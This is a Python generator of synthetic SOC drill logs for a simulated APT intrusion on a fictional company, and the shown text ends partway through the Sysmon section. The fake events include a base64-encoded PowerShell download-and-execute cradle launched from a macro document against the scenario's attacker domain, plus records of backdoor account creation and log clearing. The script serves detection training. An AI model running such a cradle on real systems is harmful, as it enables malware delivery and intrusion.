#!/usr/bin/env python3
"""
SOC Cyber Drill — Synthetic Log Generator
PT Nusantara Digital — APT Attack Scenario
Generates ~50K correlated events across 8 log sources
"""

import json, random, os, hashlib
from datetime import datetime, timedelta

random.seed(42)  # Reproducible

# ─── CONFIG ─────────────────────────────────────────────
OUT_DIR = "generated_logs"
os.makedirs(OUT_DIR, exist_ok=True)

# Timeline: 3 days starting Apr 7, 2026
BASE = datetime(2026, 4, 7, 0, 0, 0)
DAY1 = BASE
DAY2 = BASE + timedelta(days=1)
DAY3 = BASE + timedelta(days=2)

# ─── ASSETS ─────────────────────────────────────────────
HOSTS = {
    "fw": {"name": "FW-EDGE-01", "ip_ext": "203.0.113.1", "ip_int": "10.10.0.1"},
    "web": {"name": "WEB-SERVER-01", "ip": "10.10.1.10"},
    "ws1": {"name": "WS-FINANCE-01", "ip": "10.10.2.50", "user": "ratna.finance", "fqdn": "WS-FINANCE-01.nusantara.local"},
    "ws2": {"name": "WS-HR-02", "ip": "10.10.2.51", "user": "budi.hr", "fqdn": "WS-HR-02.nusantara.local"},
    "dc":  {"name": "DC-01", "ip": "10.10.3.10", "fqdn": "DC-01.nusantara.local"},
    "db":  {"name": "DB-SERVER-01", "ip": "10.10.3.20"},
}

ATTACKER = {
    "scanner": "91.215.85.142",
    "staging": "185.234.216.88",
    "c2": "45.77.65.211",
    "c2_domain": "update-service.cloud",
    "payload_domain": "dl.techsupport-cdn.net",
    "payload_hash": "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890",
    "payload_path": r"C:\Users\ratna.finance\AppData\Local\Temp\svchost_update.exe",
    "c2_ua": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)",
    "backdoor_user": "svc_backup",
}

NORMAL_DOMAINS = [
    "google.com","www.google.com","gmail.com","mail.google.com","youtube.com",
    "facebook.com","instagram.com","twitter.com","microsoft.com","office.com",
    "login.microsoftonline.com","windows.com","windowsupdate.com","teams.microsoft.com",
    "amazonaws.com","cloudfront.net","akamai.net","cdn.jsdelivr.net",
    "dc-01.nusantara.local","db-server-01.nusantara.local","web-server-01.nusantara.local",
    "detik.com","kompas.com","tokopedia.com","shopee.co.id","bukalapak.com",
    "linkedin.com","github.com","stackoverflow.com","medium.com",
    "zoom.us","slack.com","notion.so","figma.com",
]

NORMAL_EXT_IPS = [
    "142.250.80.46","142.250.80.68","172.217.194.94","13.107.42.14","13.107.246.53",
    "20.190.151.68","52.96.87.18","104.16.132.229","104.16.133.229","151.101.1.69",
    "151.101.65.69","198.35.26.96","103.102.166.224","103.49.221.35","104.18.32.7",
    "157.240.203.35","31.13.72.36","69.63.176.13","34.107.221.82","35.186.224.25",
]

NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 Safari/605.1.15",
]

WIN_NORMAL_PROCS = [
    (r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe"),
    (r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "OUTLOOK.EXE"),
    (r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "EXCEL.EXE"),
    (r"C:\Windows\explorer.exe", "explorer.exe"),
    (r"C:\Windows\System32\svchost.exe", "svchost.exe"),
    (r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "msedge.exe"),
    (r"C:\Users\ratna.finance\AppData\Local\Microsoft\Teams\current\Teams.exe", "Teams.exe"),
    (r"C:\Windows\System32\taskhostw.exe", "taskhostw.exe"),
    (r"C:\Windows\System32\RuntimeBroker.exe", "RuntimeBroker.exe"),
]

# ─── HELPERS ────────────────────────────────────────────
def ts(dt): return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{random.randint(0,999):03d}+0700"
def ts_syslog(dt): return dt.strftime("%b %d %H:%M:%S")
def ts_win(dt): return dt.strftime("%m/%d/%Y %I:%M:%S %p")
def jitter(dt, sec=30): return dt + timedelta(seconds=random.randint(-sec, sec))
def rand_port(): return random.randint(49152, 65535)
def rand_bytes(): return random.randint(200, 15000)

def business_hours(dt):
    h = dt.hour
    wd = dt.weekday()
    return wd < 5 and 8 <= h <= 18

def rand_time_in_range(start, end):
    delta = (end - start).total_seconds()
    return start + timedelta(seconds=random.random() * delta)

# ─── GENERATORS ─────────────────────────────────────────

# ===== FIREWALL =====
def gen_firewall():
    logs = []
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        # Normal traffic: ~5000/day
        for _ in range(5000):
            t = rand_time_in_range(day, day + timedelta(hours=23, minutes=59))
            if business_hours(t):
                src = random.choice([HOSTS["ws1"]["ip"], HOSTS["ws2"]["ip"], HOSTS["dc"]["ip"], HOSTS["web"]["ip"], HOSTS["db"]["ip"]])
                dst = random.choice(NORMAL_EXT_IPS)
                dport = random.choice([443, 443, 443, 80, 53, 8080])
                action = "allow"
                app = random.choice(["ssl","web-browsing","dns","ms-update","office365"])
                bsent, brecv = rand_bytes(), rand_bytes()
            else:
                # After hours: less traffic, mostly servers
                src = random.choice([HOSTS["web"]["ip"], HOSTS["db"]["ip"], HOSTS["dc"]["ip"]])
                dst = random.choice(NORMAL_EXT_IPS[:5])
                dport = random.choice([443, 53, 123])
                action = "allow"
                app = random.choice(["ssl","dns","ntp"])
                bsent, brecv = random.randint(50,500), random.randint(50,500)
            
            logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,end,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{src},{dst},0.0.0.0,0.0.0.0,allow-outbound,,,{app},vsys1,trust,untrust,ethernet1/2,ethernet1/1,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},{dport},0,0,0x0,tcp,{action},{bsent+brecv},{bsent},{brecv},1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,Indonesia,United States,0,1,0,{action},0,0,0,0,,FW-EDGE-01,from-policy')
        
        # Random external scanners hitting us (deny) ~50/day
        for _ in range(50):
            t = rand_time_in_range(day, day + timedelta(hours=23, minutes=59))
            scanner_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            dport = random.choice([22, 23, 445, 3389, 8080, 8443, 3306, 5432])
            logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,drop,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{scanner_ip},203.0.113.1,0.0.0.0,0.0.0.0,deny-all,,,incomplete,vsys1,untrust,trust,ethernet1/1,,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},{dport},0,0,0x0,tcp,deny,60,60,0,1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,unknown,Indonesia,0,1,0,policy-deny,0,0,0,0,,FW-EDGE-01,from-policy')

    # ATTACK: Day 1 - recon scan from 91.215.85.142 (09:15-09:20)
    for port in [21,22,23,25,80,110,135,139,443,445,993,995,1433,3306,3389,5432,8080,8443]:
        t = DAY1.replace(hour=9, minute=15) + timedelta(seconds=random.randint(0,300))
        logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,drop,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{ATTACKER["scanner"]},203.0.113.1,0.0.0.0,0.0.0.0,deny-all,,,incomplete,vsys1,untrust,trust,ethernet1/1,,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},{port},0,0,0x0,tcp,deny,60,60,0,1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,Romania,Indonesia,0,1,0,policy-deny,0,0,0,0,,FW-EDGE-01,from-policy')

    # ATTACK: Day 1 - C2 beacon from WS-FINANCE-01 to 45.77.65.211 (14:49 onwards, every ~60s)
    t = DAY1.replace(hour=14, minute=49)
    end_day3 = DAY3.replace(hour=18)
    while t < end_day3:
        bsent = random.randint(200, 800)
        brecv = random.randint(100, 400)
        logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,end,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["ws1"]["ip"]},{ATTACKER["c2"]},0.0.0.0,0.0.0.0,allow-outbound,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},443,0,0,0x0,tcp,allow,{bsent+brecv},{bsent},{brecv},1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Netherlands,0,1,0,allow,0,0,0,0,,FW-EDGE-01,from-policy')
        t += timedelta(seconds=random.randint(50, 70))

    # ATTACK: Day 1 - Payload download from staging
    t = DAY1.replace(hour=14, minute=47, second=30)
    logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,end,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["ws1"]["ip"]},{ATTACKER["staging"]},0.0.0.0,0.0.0.0,allow-outbound,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},443,0,0,0x0,tcp,allow,358000,1200,356800,1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Russia,0,1,0,allow,0,0,0,0,,FW-EDGE-01,from-policy')

    # ATTACK: Day 3 - Exfiltration large transfer 02:30
    t = DAY3.replace(hour=2, minute=30)
    logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,TRAFFIC,end,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["db"]["ip"]},{ATTACKER["staging"]},0.0.0.0,0.0.0.0,allow-outbound,,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},443,0,0,0x0,tcp,allow,262144000,262000000,144000,1,{t.strftime("%Y/%m/%d %H:%M:%S")},0,any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Russia,0,1,0,allow,0,0,0,0,,FW-EDGE-01,from-policy')

    logs.sort()
    with open(f"{OUT_DIR}/firewall.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Firewall: {len(logs)} events")
    return len(logs)

# ===== DNS =====
def gen_dns():
    logs = []
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for _ in range(2600):
            t = rand_time_in_range(day, day + timedelta(hours=23, minutes=59))
            src = random.choice([HOSTS["ws1"]["ip"], HOSTS["ws2"]["ip"], HOSTS["dc"]["ip"], HOSTS["web"]["ip"], HOSTS["db"]["ip"]])
            domain = random.choice(NORMAL_DOMAINS)
            rtype = "A"
            answer = random.choice(NORMAL_EXT_IPS) if ".local" not in domain else HOSTS["dc"]["ip"]
            logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,THREAT,dns,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{src},8.8.8.8,0.0.0.0,0.0.0.0,dns-default,,,dns-wildfire,vsys1,trust,untrust,ethernet1/2,,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},53,0,0,0x0,udp,allow,100,100,0,1,{t.strftime("%Y/%m/%d %H:%M:%S")},{domain},any,0,{random.randint(10000000,99999999)},0x0,Indonesia,United States,0,1,0,0,0,,FW-EDGE-01,dns-log,{rtype},{answer}')

    # ATTACK DNS: C2 domain resolve + payload domain
    t1 = DAY1.replace(hour=14, minute=47, second=10)
    logs.append(f'{ts_syslog(t1)} FW-EDGE-01 1,{t1.strftime("%Y/%m/%d %H:%M:%S")},001234567890,THREAT,dns,2560,{t1.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["ws1"]["ip"]},8.8.8.8,0.0.0.0,0.0.0.0,dns-default,,,dns-wildfire,vsys1,trust,untrust,ethernet1/2,,All-Logs,{t1.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},53,0,0,0x0,udp,allow,100,100,0,1,{t1.strftime("%Y/%m/%d %H:%M:%S")},{ATTACKER["payload_domain"]},any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Netherlands,0,1,0,0,0,,FW-EDGE-01,dns-log,A,{ATTACKER["staging"]}')
    
    t2 = DAY1.replace(hour=14, minute=48, second=50)
    logs.append(f'{ts_syslog(t2)} FW-EDGE-01 1,{t2.strftime("%Y/%m/%d %H:%M:%S")},001234567890,THREAT,dns,2560,{t2.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["ws1"]["ip"]},8.8.8.8,0.0.0.0,0.0.0.0,dns-default,,,dns-wildfire,vsys1,trust,untrust,ethernet1/2,,All-Logs,{t2.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},53,0,0,0x0,udp,allow,100,100,0,1,{t2.strftime("%Y/%m/%d %H:%M:%S")},{ATTACKER["c2_domain"]},any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Netherlands,0,1,0,0,0,,FW-EDGE-01,dns-log,A,{ATTACKER["c2"]}')

    # C2 domain periodic re-resolve
    t = DAY1.replace(hour=15)
    while t < DAY3.replace(hour=18):
        logs.append(f'{ts_syslog(t)} FW-EDGE-01 1,{t.strftime("%Y/%m/%d %H:%M:%S")},001234567890,THREAT,dns,2560,{t.strftime("%Y/%m/%d %H:%M:%S")},{HOSTS["ws1"]["ip"]},8.8.8.8,0.0.0.0,0.0.0.0,dns-default,,,dns-wildfire,vsys1,trust,untrust,ethernet1/2,,All-Logs,{t.strftime("%Y/%m/%d %H:%M:%S")},0,1,{rand_port()},53,0,0,0x0,udp,allow,100,100,0,1,{t.strftime("%Y/%m/%d %H:%M:%S")},{ATTACKER["c2_domain"]},any,0,{random.randint(10000000,99999999)},0x0,Indonesia,Netherlands,0,1,0,0,0,,FW-EDGE-01,dns-log,A,{ATTACKER["c2"]}')
        t += timedelta(minutes=random.randint(25,35))

    logs.sort()
    with open(f"{OUT_DIR}/dns.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  DNS: {len(logs)} events")
    return len(logs)

# ===== SURICATA =====
def gen_suricata():
    logs = []
    base_fid = 1000000000
    
    # Normal flow events
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for _ in range(1500):
            t = rand_time_in_range(day, day + timedelta(hours=23, minutes=59))
            src = random.choice(NORMAL_EXT_IPS)
            sp = rand_port()
            dp = random.choice([80, 443])
            proto = "TCP"
            fid = base_fid + random.randint(0, 999999999)
            ev = {"timestamp": ts(t), "flow_id": fid, "event_type": "flow", "src_ip": src, "src_port": sp, "dest_ip": HOSTS["web"]["ip"], "dest_port": dp, "proto": proto, "flow": {"pkts_toserver": random.randint(5,50), "pkts_toclient": random.randint(5,80), "bytes_toserver": random.randint(500,5000), "bytes_toclient": random.randint(1000,50000), "start": ts(t)}}
            logs.append(json.dumps(ev))

    # ATTACK: Port scan alerts from 91.215.85.142
    for port in [21,22,23,25,80,110,135,139,443,445,993,995,1433,3306,3389,5432,8080,8443]:
        t = DAY1.replace(hour=9, minute=15) + timedelta(seconds=random.randint(0,120))
        fid = base_fid + random.randint(0, 999999999)
        ev = {"timestamp": ts(t), "flow_id": fid, "event_type": "alert", "src_ip": ATTACKER["scanner"], "src_port": rand_port(), "dest_ip": HOSTS["web"]["ip"], "dest_port": port, "proto": "TCP",
              "alert": {"action": "allowed", "gid": 1, "signature_id": 2001219, "rev": 20, "signature": f"ET SCAN Potential SSH Scan OUTBOUND" if port==22 else "ET SCAN Suspicious inbound to port " + str(port), "category": "Attempted Information Leak", "severity": 2}}
        logs.append(json.dumps(ev))

    # ATTACK: Web scan alerts (SQLi, XSS attempts)
    web_sigs = [
        (2100498, "ET WEB_SERVER SQL Injection Attempt SELECT FROM", "Web Application Attack"),
        (2100499, "ET WEB_SERVER SQL Injection Attempt UNION SELECT", "Web Application Attack"),
        (2100502, "ET WEB_SERVER Cross-Site Scripting Attempt", "Web Application Attack"),
        (2100503, "ET WEB_SERVER Directory Traversal Attempt", "Web Application Attack"),
    ]
    for sid, sig, cat in web_sigs:
        for _ in range(3):
            t = DAY1.replace(hour=9, minute=16) + timedelta(seconds=random.randint(0,240))
            ev = {"timestamp": ts(t), "flow_id": base_fid + random.randint(0,999999999), "event_type": "alert", "src_ip": ATTACKER["scanner"], "src_port": rand_port(), "dest_ip": HOSTS["web"]["ip"], "dest_port": 80, "proto": "TCP",
                  "alert": {"action": "allowed", "gid": 1, "signature_id": sid, "rev": 10, "signature": sig, "category": cat, "severity": 1}}
            logs.append(json.dumps(ev))

    # ATTACK: Payload download detection
    t = DAY1.replace(hour=14, minute=47, second=35)
    ev = {"timestamp": ts(t), "flow_id": base_fid + random.randint(0,999999999), "event_type": "alert", "src_ip": HOSTS["ws1"]["ip"], "src_port": rand_port(), "dest_ip": ATTACKER["staging"], "dest_port": 443, "proto": "TCP",
          "alert": {"action": "allowed", "gid": 1, "signature_id": 2013028, "rev": 5, "signature": "ET POLICY curl/wget User-Agent Outbound", "category": "Potential Corporate Privacy Violation", "severity": 2}}
    logs.append(json.dumps(ev))

    # ATTACK: Day 3 exfil
    t = DAY3.replace(hour=2, minute=30, second=15)
    ev = {"timestamp": ts(t), "flow_id": base_fid + random.randint(0,999999999), "event_type": "alert", "src_ip": HOSTS["db"]["ip"], "src_port": rand_port(), "dest_ip": ATTACKER["staging"], "dest_port": 443, "proto": "TCP",
          "alert": {"action": "allowed", "gid": 1, "signature_id": 2013028, "rev": 5, "signature": "ET POLICY curl/wget User-Agent Outbound", "category": "Potential Corporate Privacy Violation", "severity": 2}}
    logs.append(json.dumps(ev))

    logs.sort()
    with open(f"{OUT_DIR}/suricata_eve.json", "w") as f:
        f.write("\n".join(logs))
    print(f"  Suricata: {len(logs)} events")
    return len(logs)

# ===== WINDOWS SECURITY =====
def gen_windows():
    logs = []
    win_hosts = [
        (HOSTS["ws1"]["fqdn"], HOSTS["ws1"]["user"], HOSTS["ws1"]["ip"]),
        (HOSTS["ws2"]["fqdn"], HOSTS["ws2"]["user"], HOSTS["ws2"]["ip"]),
        (HOSTS["dc"]["fqdn"], "administrator", HOSTS["dc"]["ip"]),
    ]
    
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for host, user, ip in win_hosts:
            # Morning login 4624 type 2
            t = day.replace(hour=8, minute=random.randint(0,29))
            logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4624 EventType=0 Type=Information ComputerName={host} TaskCategory=Logon Keywords=Audit Success Message=An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: {host.split(".")[0]}$ Logon Type: 2 New Logon: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: {user} Account Domain: NUSANTARA Logon ID: 0x{random.randint(100000,999999):X} Network Information: Source Network Address: - Source Port: -')
            
            # Kerberos TGT 4768
            logs.append(f'{ts_win(jitter(t,60))} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4768 EventType=0 Type=Information ComputerName={HOSTS["dc"]["fqdn"]} TaskCategory=Kerberos Authentication Service Keywords=Audit Success Message=A Kerberos authentication ticket (TGT) was requested. Account Information: Account Name: {user} Supplied Realm Name: NUSANTARA Client Address: {ip}')
            
            # Evening logoff 4634
            t_off = day.replace(hour=random.randint(17,19), minute=random.randint(0,59))
            logs.append(f'{ts_win(t_off)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4634 EventType=0 Type=Information ComputerName={host} TaskCategory=Logoff Keywords=Audit Success Message=An account was logged off. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: {user} Account Domain: NUSANTARA Logon ID: 0x{random.randint(100000,999999):X}')
            
            # Normal 4688 process creation throughout day
            for _ in range(random.randint(400, 600)):
                t = rand_time_in_range(day.replace(hour=8), day.replace(hour=18))
                proc, pname = random.choice(WIN_NORMAL_PROCS)
                logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4688 EventType=0 Type=Information ComputerName={host} TaskCategory=Process Creation Keywords=Audit Success Message=A new process has been created. Creator Subject: Account Name: {user} New Process Information: New Process Name: {proc} Process Command Line: "{proc}"')
            
            # Random failed login (mistyped password)
            if random.random() < 0.3:
                t = day.replace(hour=random.randint(8,17), minute=random.randint(0,59))
                logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4625 EventType=0 Type=Information ComputerName={host} TaskCategory=Logon Keywords=Audit Failure Message=An account failed to log on. Subject: Security ID: S-1-0-0 Logon Type: 2 Account For Which Logon Failed: Account Name: {user} Account Domain: NUSANTARA Failure Information: Failure Reason: Unknown user name or bad password. Status: 0xC000006D Sub Status: 0xC000006A')

    # ── ATTACK EVENTS ──
    ws1 = HOSTS["ws1"]["fqdn"]
    dc = HOSTS["dc"]["fqdn"]
    
    # Day 2: 09:20 - Pass the Hash to DC (4624 type 3 NTLM)
    t = DAY2.replace(hour=9, minute=20)
    logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4624 EventType=0 Type=Information ComputerName={dc} TaskCategory=Logon Keywords=Audit Success Message=An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Logon Type: 3 New Logon: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Logon ID: 0xABCDEF Network Information: Source Network Address: {HOSTS["ws1"]["ip"]} Source Port: {rand_port()} Logon Process: NtLmSsp Authentication Package: NTLM')
    
    # 4672 admin logon on DC
    logs.append(f'{ts_win(jitter(t,5))} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4672 EventType=0 Type=Information ComputerName={dc} TaskCategory=Special Logon Keywords=Audit Success Message=Special privileges assigned to new logon. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Logon ID: 0xABCDEF Privileges: SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege SeEnableDelegationPrivilege')
    
    # Day 2: 09:22 - Create backdoor account 4720
    t = DAY2.replace(hour=9, minute=22)
    logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4720 EventType=0 Type=Information ComputerName={dc} TaskCategory=User Account Management Keywords=Audit Success Message=A user account was created. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA New Account: Security ID: S-1-5-21-1234567890-987654321-1122334455-9999 Account Name: {ATTACKER["backdoor_user"]} Account Domain: NUSANTARA')
    
    # 4728 - added to Domain Admins
    t2 = DAY2.replace(hour=9, minute=22, second=30)
    logs.append(f'{ts_win(t2)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4728 EventType=0 Type=Information ComputerName={dc} TaskCategory=Security Group Management Keywords=Audit Success Message=A member was added to a security-enabled global group. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Member: Security ID: S-1-5-21-1234567890-987654321-1122334455-9999 Account Name: {ATTACKER["backdoor_user"]} Group: Security ID: S-1-5-21-1234567890-987654321-1122334455-512 Group Name: Domain Admins Group Domain: NUSANTARA')
    
    # Day 2: 09:30 - Scheduled task 4698
    t = DAY2.replace(hour=9, minute=30)
    logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=4698 EventType=0 Type=Information ComputerName={ws1} TaskCategory=Other Object Access Events Keywords=Audit Success Message=A scheduled task was created. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Task Information: Task Name: \\Microsoft\\Windows\\Maintenance\\SystemUpdate')
    
    # Day 3: 02:40 - Event log cleared 1102
    t = DAY3.replace(hour=2, minute=40)
    logs.append(f'{ts_win(t)} LogName=Security SourceName=Microsoft-Windows-Security-Auditing EventCode=1102 EventType=0 Type=Information ComputerName={ws1} TaskCategory=Log clear Keywords=Audit Success Message=The audit log was cleared. Subject: Security ID: S-1-5-21-1234567890-987654321-1122334455-1105 Account Name: ratna.finance Account Domain: NUSANTARA Logon ID: 0x{random.randint(100000,999999):X}')

    logs.sort()
    with open(f"{OUT_DIR}/windows_security.log", "w") as f:
        f.write("\n".join(logs))
    print(f"  Windows Security: {len(logs)} events")
    return len(logs)

# ===== SYSMON =====
def gen_sysmon():
    logs = []
    ws1 = HOSTS["ws1"]["fqdn"]
    dc = HOSTS["dc"]["fqdn"]
    
    for day_offset in range(3):
        day = BASE + timedelta(days=day_offset)
        for host in [ws1, HOSTS["ws2"]["fqdn"], dc]:
            user = "ratna.finance" if "FINANCE" in host else ("budi.hr" if "HR" in host else "administrator")
            # Normal process creation (Event 1)
            for _ in range(random.randint(300, 500)):
                t = rand_time_in_range(day.replace(hour=8), day.replace(hour=18))
                proc, pname = random.choice(WIN_NORMAL_PROCS)
                ppid = random.randint(1000, 9999)
                pid = random.randint(1000, 9999)
                logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{host}</Computer></System><EventData><Data Name="UtcTime">{t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}</Data><Data Name="ProcessId">{pid}</Data><Data Name="Image">{proc}</Data><Data Name="CommandLine">"{proc}"</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data><Data Name="ParentProcessId">{ppid}</Data><Data Name="User">NUSANTARA\\{user}</Data><Data Name="Hashes">SHA256={hashlib.sha256(proc.encode()).hexdigest()}</Data></EventData></Event>')
            
            # Normal network connections (Event 3)
            for _ in range(random.randint(100, 200)):
                t = rand_time_in_range(day.replace(hour=8), day.replace(hour=18))
                dst = random.choice(NORMAL_EXT_IPS)
                logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>3</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{host}</Computer></System><EventData><Data Name="Image">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name="User">NUSANTARA\\{user}</Data><Data Name="SourceIp">{HOSTS["ws1"]["ip"] if "FINANCE" in host else HOSTS["ws2"]["ip"]}</Data><Data Name="SourcePort">{rand_port()}</Data><Data Name="DestinationIp">{dst}</Data><Data Name="DestinationPort">443</Data><Data Name="Protocol">tcp</Data></EventData></Event>')

            # Normal DNS queries (Event 22)
            for _ in range(random.randint(80, 150)):
                t = rand_time_in_range(day.replace(hour=8), day.replace(hour=18))
                domain = random.choice(NORMAL_DOMAINS)
                logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>22</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{host}</Computer></System><EventData><Data Name="Image">C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</Data><Data Name="QueryName">{domain}</Data><Data Name="QueryResults">{random.choice(NORMAL_EXT_IPS)}</Data></EventData></Event>')

    # ── ATTACK SYSMON EVENTS ──
    
    # Day 1 14:47 - WINWORD spawns cmd → powershell (Event 1 chain)
    t = DAY1.replace(hour=14, minute=47, second=5)
    logs.append(f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="{t.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]}Z"/><Computer>{ws1}</Computer></System><EventData><Data Name="RuleName">technique_id=T1204.002</Data><Data Name="UtcTime">{t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]}</Data><Data Name="ProcessId">4120</Data><Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data><Data Name="CommandLine">cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBkAGwALgB0AGUAYwBoAHMAdQBwAHAAbwByAHQALQBjAGQAbgAuAG4AZQB0AC8AdQBwAGQAYQB0AGUALgBlAHgAZQAnACkA</Data><Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name="ParentCommandLine">"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\ratna.finance\\Downloads\\Invoice_Q1_2026.docm"</Data><Data Name="ParentProcessId">3856</Data><Data Name="User">NUSANTARA\\ratna.finance</Data><Data Name="Hashes">SHA256=abc123def456</Data></EventData></Event>')

